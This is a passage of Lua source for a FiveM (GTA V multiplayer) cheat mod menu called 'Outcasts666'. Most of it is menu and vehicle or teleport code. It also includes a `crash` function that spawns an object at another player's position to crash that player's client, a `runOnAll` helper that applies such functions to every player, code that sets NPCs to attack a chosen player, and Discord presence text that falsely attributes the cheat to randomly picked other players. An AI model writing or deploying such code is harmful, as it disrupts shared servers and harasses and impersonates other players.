            setMenuVisible(id, true)
            debugPrint(tostring(id)..' menu opened')
        else
            debugPrint('Failed to open '..tostring(id)..' menu: it doesn\'t exist')
        end
    end
    
    
    function Outcasts666.IsMenuOpened(id)
        return isMenuVisible(id)
    end
    
    
    function Outcasts666.IsAnyMenuOpened()
        for id, _ in pairs(menus) do
            if isMenuVisible(id) then return true end
        end
    
        return false
    end
    
    
    function Outcasts666.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
            return menus[currentMenu].aboutToBeClosed
        else
            return false
        end
    end
    
    
    function Outcasts666.CloseMenu()
        if menus[currentMenu] then
            if menus[currentMenu].aboutToBeClosed then
                menus[currentMenu].aboutToBeClosed = false
                setMenuVisible(currentMenu, false)
                debugPrint(tostring(currentMenu)..' menu closed')
                PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                optionCount = 0
                currentMenu = nil
                currentKey = nil
            else
                menus[currentMenu].aboutToBeClosed = true
                debugPrint(tostring(currentMenu)..' menu about to be closed')
            end
        end
    end
    
    
    function Outcasts666.Button(text, subText)
        local buttonText = text
        if subText then
            buttonText = '{ '..tostring(buttonText)..', '..tostring(subText)..' }'
        end
    
        if menus[currentMenu] then
            optionCount = optionCount + 1
    
            local isCurrent = menus[currentMenu].currentOption == optionCount
    
            drawButton(text, subText)
    
            if isCurrent then
                if currentKey == keys.select then
                    PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                    debugPrint(buttonText..' button pressed')
                    return true
                elseif currentKey == keys.left or currentKey == keys.right then
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                end
            end
    
            return false
        else
            debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')
    
            return false
        end
    end
    
    
    function Outcasts666.MenuButton(text, id)
        if menus[id] then
            if Outcasts666.Button(text) then
                setMenuVisible(currentMenu, false)
                setMenuVisible(id, true, true)
    
                return true
            end
        else
            debugPrint('Failed to create '..tostring(text)..' menu button: '..tostring(id)..' submenu doesn\'t exist')
        end
    
        return false
    end
    
    
    function Outcasts666.CheckBox(text, checked, callback)
        if Outcasts666.Button(text, checked and '~h~~w~On' or "~h~~c~Off") then
            checked = not checked
            debugPrint(tostring(text)..' checkbox changed to '..tostring(checked))
            if callback then callback(checked) end
    
            return true
        end
    
        return false
    end
    
    
    function Outcasts666.ComboBox(text, items, currentIndex, selectedIndex, callback)
        local itemsCount = #items
        local selectedItem = items[currentIndex]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
    
        if itemsCount > 1 and isCurrent then
            selectedItem = '← '..tostring(selectedItem)..' →'
        end
    
        if Outcasts666.Button(text, selectedItem) then
            selectedIndex = currentIndex
            callback(currentIndex, selectedIndex)
            return true
        elseif isCurrent then
            if currentKey == keys.left then
                if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
            elseif currentKey == keys.right then
                if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
            end
        else
            currentIndex = selectedIndex
        end
    
        callback(currentIndex, selectedIndex)
        return false
    end
    
    function Outcasts666.Display()
        if isMenuVisible(currentMenu) then
            if menus[currentMenu].aboutToBeClosed then
                Outcasts666.CloseMenu()
            else
                ClearAllHelpMessages()
    
                drawTitle()
                drawSubTitle()
    
                currentKey = nil
    
                if IsControlJustReleased(1, keys.down) then
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
    
                    if menus[currentMenu].currentOption < optionCount then
                        menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                    else
                        menus[currentMenu].currentOption = 1
                    end
                elseif IsControlJustReleased(1, keys.up) then
                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
    
                    if menus[currentMenu].currentOption > 1 then
                        menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                    else
                        menus[currentMenu].currentOption = optionCount
                    end
                elseif IsControlJustReleased(1, keys.left) then
                    currentKey = keys.left
                elseif IsControlJustReleased(1, keys.right) then
                    currentKey = keys.right
                elseif IsControlJustReleased(1, keys.select) then
                    currentKey = keys.select
                elseif IsControlJustReleased(1, keys.back) then
                    if menus[menus[currentMenu].previousMenu] then
                        PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                        setMenuVisible(menus[currentMenu].previousMenu, true)
                    else
                        Outcasts666.CloseMenu()
                    end
                end
    
                optionCount = 0
            end
        end
    end
    
    
    function Outcasts666.SetMenuWidth(id, width)
        setMenuProperty(id, 'width', width)
    end
    
    
    function Outcasts666.SetMenuX(id, x)
        setMenuProperty(id, 'x', x)
    end
    
    
    function Outcasts666.SetMenuY(id, y)
        setMenuProperty(id, 'y', y)
    end
    
    
    function Outcasts666.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, 'maxOptionCount', count)
    end
    
    
    function Outcasts666.SetTitle(id, title)
        setMenuProperty(id, 'title', title)
    end
    
    
    function Outcasts666.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, 'titleColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a })
    end
    
    
    function Outcasts666.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(id, 'titleBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a })
    end
    
    
    function Outcasts666.SetTitleBackgroundSprite(id, textureDict, textureName)
        RequestStreamedTextureDict(textureDict)
        setMenuProperty(id, 'titleBackgroundSprite', { dict = textureDict, name = textureName })
    end
    
    function Outcasts666.SetSpriteColor(id, r, g, b, a)
        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end
    
    function Outcasts666.SetSubTitle(id, text)
        setMenuProperty(id, 'subTitle', string.upper(text))
    end
    
    
    function Outcasts666.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(id, 'menuBackgroundColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end
    
    
    function Outcasts666.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, 'menuTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a })
    end
    
    function Outcasts666.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, 'menuSubTextColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a })
    end
    
    function Outcasts666.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, 'menuFocusColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a })
    end
    
    
    function Outcasts666.SetMenuButtonPressedSound(id, name, set)
        setMenuProperty(id, 'buttonPressedSound', { ['name'] = name, ['set'] = set })
    end
    
    function drawNotification(text)
        SetNotificationTextEntry("STRING")
        AddTextComponentString(text)
        DrawNotification(false, false)
    end
    
    function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
    end
    
    local function drawOnscreenText(text, x, y)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextScale(0.0,0.4)
        SetTextDropshadow(1,0,0,0,255)
        SetTextEdge(1,0,0,0,255)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(x,y)
     end
    
     local function bk()
        local ab=KeyboardInput("Enter Blip Name","",100)
        if ab==""then 
            drawNotification("~r~Invalid Blip Name!")
            return bk()
        else 
            local bh=KeyboardInput("Enter X pos","",100)
            local bi=KeyboardInput("Enter Y pos","",100)
            local bj=KeyboardInput("Enter Z pos","",100)
            if bh~=""and bi~=""and bj~=""then 
                local bl={{colour=75,model=84}}
                for _,bm in pairs(bl)do bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR=AddBlipForCoord(bh+0.5,bi+0.5,bj+0.5)
                    SetBlipSprite(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.model)SetBlipDisplay(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,4)
                    SetBlipScale(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,0.9)SetBlipColour(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,bm.colour)SetBlipAsShortRange(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR,true)BeginTextCommandSetBlipName("STRING")
                    AddTextComponentString(ab)
                    EndTextCommandSetBlipName(bm.vNtrqJZiWyFdNeBgfuiZaIbPXdAFuujnOquyqWRrqLUeXxcCCFyGgmYIdeyeMEiDCVjPNWXDeepkALFXGCTmlPoZisdmRdLGjYmbaYeqBeiiNLgUBSeHNxIfMbkR)end 
                else 
                    drawNotification("~r~Invalid coords!")
                end
            end 
        end
    
        function Initialize(scaleform, message)
            local scaleform = RequestScaleformMovie(scaleform)
            while not HasScaleformMovieLoaded(scaleform) do
                Citizen.Wait(1)
            end
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
            PushScaleformMovieFunctionParameterString(message)
            PopScaleformMovieFunctionVoid()
            return scaleform
        end
    
    function MaxOut(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
    end
    
    function MaxOutPerf(veh)
        SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    end
    
    local function DrawTxt(text, x, y)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextScale(0.0, 0.4)
        SetTextDropshadow(1, 0, 0, 0, 255)
        SetTextEdge(1, 0, 0, 0, 255)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        AddTextComponentString(text)
        DrawText(x, y)
    end
    
    function ch(C,x,y)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextScale(0.0,0.4)
        SetTextDropshadow(1,0,0,0,255)
        SetTextEdge(1,0,0,0,255)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        AddTextComponentString(C)
        DrawText(x,y)
    end
    
    local function getPlayerIds()
        local players = {}
        for i = -1, 128 do
            if NetworkIsPlayerActive(i) then
                players[#players + 1] = i
            end
        end
        return players
    end
    
    local function DrawText3D(x, y, z, text, r, g, b)
        SetDrawOrigin(x, y, z, 0)
        SetTextFont(0)
        SetTextProportional(0)
        SetTextScale(0.0, 0.20)
        SetTextColour(r, g, b, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(0.0, 0.0)
        ClearDrawOrigin()
    end
    
    local function checkValidVehicleExtras() 
        local aq = PlayerPedId() 
        local ar = GetVehiclePedIsIn(aq, false) 
        local as = {}
        for i = 0, 50, 1 do
            if DoesExtraExist(ar, i) then local at = "Extra #"..tostring(i) local C = "OFF"
        if IsVehicleExtraTurnedOn(ar, i) then C = "ON"
        end;
        local au = "extra "..tostring(i) table.insert(as, {
            menuName = realModName, data = {
                ["action"] = realSpawnName, ["state"] = C
            }
        }) end end;
        return as end;
        
        function DoesVehicleHaveExtras(veh) for i = 1, 30 do
            if DoesExtraExist(veh, i) then
        return true end end;
        return false end;
        
        function checkValidVehicleMods(av) local aq = PlayerPedId() local ar = GetVehiclePedIsIn(aq, false) local as = {}
        local aw = GetNumVehicleMods(ar, av) if av == 48 and aw == 0 then local aw = GetVehicleLiveryCount(ar) for i = 1, aw, 1 do local ax = i - 1;
            local ay = GetLiveryName(ar, ax) local realModName = GetLabelText(ay) local az, realSpawnName = av, ax;
        as[i] = {
            menuName = realModName, data = {
                ["modid"] = az, ["realIndex"] = realSpawnName
            }
        }
        end end;
        for i = 1, aw, 1 do local ax = i - 1;
            local ay = GetModTextLabel(ar, av, ax) local realModName = GetLabelText(ay) local az, realSpawnName = aw, ax;
        as[i] = {
            menuName = realModName, data = {
                ["modid"] = az, ["realIndex"] = realSpawnName
            }
        }
        end;
        if aw > 0 then local ax = -1;
        local az, realSpawnName = av, ax;
        table.insert(as, 1, {
            menuName = "Stock", data = {
                ["modid"] = az, ["realIndex"] = realSpawnName
            }
        }) end;
        return as end;
    
    function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        blockinput = true
    
        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end
    
        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            blockinput = false
            return result
        else
            Citizen.Wait(500)
            blockinput = false
            return nil
        end
    end
    
    function DelVeh(veh)
        SetEntityAsMissionEntity(veh, 1, 1)
        DeleteEntity(veh)
    end
    
    function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
    end
    
    function TeleportToCoords()
        local x = KeyboardInput("Enter X Pos", "", 100)
        local y = KeyboardInput("Enter Y Pos", "", 100)
        local z = KeyboardInput("Enter Z Pos", "", 100)
        local entity
        if x ~= "" and y ~= "" and z ~= "" then
            if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then 
                entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
            else
                entity = PlayerPedId()
            end
            if entity then
                SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
            end
        else
            drawNotification("~g~Invalid Coords!")
        end
    end
    
    function TeleportToWaypoint()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
            local blipIterator = GetBlipInfoIdIterator(8)
            local blip = GetFirstBlipInfoId(8, blipIterator)
            WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
            wp = true
        
        
    
            local zHeigt = 0.0
            height = 1000.0
            while true do
                Citizen.Wait(0)
                if wp then
                    if
                        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                    then
                        entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                    else
                        entity = GetPlayerPed(-1)
                    end
    
                    SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                    FreezeEntityPosition(entity, true)
                    local Pos = GetEntityCoords(entity, true)
    
                    if zHeigt == 0.0 then
                        height = height - 25.0
                        SetEntityCoords(entity, Pos.x, Pos.y, height)
                        bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                    else
                        SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                        FreezeEntityPosition(entity, false)
                        wp = false
                        height = 1000.0
                        zHeigt = 0.0
                        drawNotification("~g~Teleported to waypoint!")
                        break
                    end
                end
            end
        else
            drawNotification("~r~No waypoint!")
        end
    end
    
    function RequestModelSync(bp)
        local bq=GetHashKey(bp)RequestModel(bq)
        while not HasModelLoaded(bq)do
             RequestModel(bq)
             Citizen.Wait(0)
        end 
    end
    
    local function crash(player)
        if player == PlayerId() then
            return
        end
    
        local ped = GetPlayerPed(player)
        if DoesEntityExist(ped) then
            RequestModel('proc_forest_grass01')
            while not HasModelLoaded('proc_forest_grass01') do
                Citizen.Wait(0)
            end
    
            CreateObjectNoOffset('proc_forest_grass01', GetEntityCoords(ped), true, true, false)
        end
    end
    
    local function runOnAll(func, ...)
        local players = GetActivePlayers()
        for i = 1, #players do
            pcall(func, players[i], ...)
        end
    end


local presensecheck = {
    state = true
}

local presense = true

nname = nil

count = {}

local aispeed = "50.0"

local Feltzer = false

local vehlistv = {"FBI2", "FBI"}

zzzt = 1

local vehlistc = {"Mesa3", "BARRAGE", "khanjali"}

zzzt = 1

local vehlistb = {"Italigtb2", "Italigtb", "Prototipo", "Osiris", "T20", "Turismo2", "Zentorno", "Nero2", "Cheetah"}

zzzt = 1

local vehlista = {"Vindicator", "Ruffian", "Sanchez2", "Hexer", "Gargoyle", "Enduro", "Double", "Bati", "GBurrito", "GBurrito2"}

zzzt = 1

local vehliste = {"Technical3", "Technical2", "Technical", "Dune3", "Tampa3"}

zzzt = 1


Citizen.CreateThread(
    function()
        for i = 0, 256 do
            local count1 = GetPlayerName(i)
            if count1 ~= '**Invalid**' then
                table.insert(count, count1)
            end
        end
    end
)

Citizen.CreateThread(function()
    RequestModel('s_m_y_swat_01')
    RequestModel('s_m_y_hwaycop_01')
    for i = 1, #vehlistv do
        RequestModel(vehlistv[i])
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(function()
    RequestModel('S_M_Y_Marine_03')
    RequestModel('S_M_Y_Marine_03')
    for i = 1, #vehlistc do
        RequestModel(vehlistc[i])
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(function()
    RequestModel('CS_MovPremMale')
    RequestModel('CS_MovPremMale')
    for i = 1, #vehlistb do
        RequestModel(vehlistb[i])
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(function()
    RequestModel('G_M_Y_Lost_03')
    RequestModel('G_M_Y_Lost_03')
    for i = 1, #vehlista do
        RequestModel(vehlista[i])
        Citizen.Wait(200)
    end
end)

Citizen.CreateThread(function()
    RequestModel('G_M_M_ChiCold_01')
    RequestModel('G_M_M_ChiCold_01')
    for i = 1, #vehliste do
        RequestModel(vehliste[i])
        Citizen.Wait(200)
    end
end)


Citizen.CreateThread(
    function()
        while presense do
            Citizen.Wait(5000)
            for i = 1, #count do
                if GetPlayerName(i) ~= count[i] then
                    table.remove(count, i, GetPlayerName(i))
                end
            end
        end
    end
)


Citizen.CreateThread(
    function()
        while presense do
            if nname ~= GetPlayerName(PlayerId()) then
                Citizen.Wait(3000)
                nname = count[math.random(#count)]
            elseif nname == GetPlayerName(PlayerId()) then
                Citizen.Wait(50)
                nname = count[math.random(#count)]
            end
        end
    end
)

local function SetRP()
    local id = GetPlayerServerId(PlayerId())
    SetRichPresence(tostring(nname) .. ' is developing OUTCAST Modding Team')
    SetDiscordAppId(appid)
    SetDiscordRichPresenceAsset(asset)
    SetDiscordRichPresenceAssetSmall(asset)
    SetDiscordRichPresenceAssetText(scroll[zzzt])
    if #count == 1 then
        SetDiscordRichPresenceAssetSmallText('Playing with ' .. GetNumberOfPlayers() .. ' player')
    else
        SetDiscordRichPresenceAssetSmallText('Playing with ' .. GetNumberOfPlayers() .. ' players')
    end
end

Citizen.CreateThread(
    function()
        while presense do
            SetRP()
            Citizen.Wait(100)
            zzzt = zzzt + 1
            if zzzt == 29 then
                zzzt = 1
            end
        end
    end
)



local function GetPedImpact(p)
    local retval, coord = GetPedLastWeaponImpactCoord(p)
    return coord
end

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

local function RequestNetworkControl(Request)
    local hasControl = false
    while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
            break
        end
        if
            NetworkHasControlOfEntity(ped) == true and hasControl == true or
                NetworkHasControlOfEntity(ped) == true and hasControl == 1
         then
            return true
        else
            return false
        end
    end
end

local function makePedHostile(target, ped, swat, clone)
    if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
    else
        if clone == 1 or clone == true then
            local Hash = GetEntityModel(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
                RequestModel(Hash)
                local coords = GetEntityCoords(GetPlayerPed(target), true)
                if HasModelLoaded(Hash) then
                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                        SetModelAsNoLongerNeeded(Hash)
                        RequestNetworkControl(newPed)
                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                        SetPedCanSwitchWeapon(ped, true)
                    end
                end
            end
        else
            local TargetHandle = GetPlayerPed(target)
            RequestNetworkControl(ped)
            TaskCombatPed(ped, TargetHandle, 0, 16)
        end
    end
end

function DrawTxt(text, x, y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
